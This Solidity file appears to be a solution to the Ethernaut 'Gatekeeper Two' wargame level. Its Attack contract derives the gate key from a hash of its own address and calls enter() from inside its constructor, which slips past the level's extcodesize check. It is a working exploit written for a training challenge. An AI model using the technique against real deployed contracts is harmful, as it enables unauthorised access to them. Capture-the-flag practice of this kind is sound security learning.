// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./15_Gatekeeper Two.sol";

contract Attack {
    GatekeeperTwo gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        uint64 hashedAddress = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        uint64 k = hashedAddress ^ type(uint64).max;
        bytes8 key = bytes8(k);
        // (bool success,) = address(gatekeeperTwo).call(abi.encodeWithSignature("enter(bytes8)", key));
        require(gatekeeperTwo.enter(key), "Wrong key");
    }
    // constructor(address _address) {
    //     bytes8 key = bytes8(
    //         uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
    //             (uint64(0) - 1)
    //     );
    //     (bool success, ) = _address.call(
    //         abi.encodeWithSignature("enter(bytes8)", key)
    //     );
    //     require(success, "Call failed");
    // }
    // function getKey() public view  returns (bytes8) {
    // uint64 hashedAddress = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    //     return bytes8(hashedAddress ^ (uint64(0) - 1));
    // }
}
// Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).
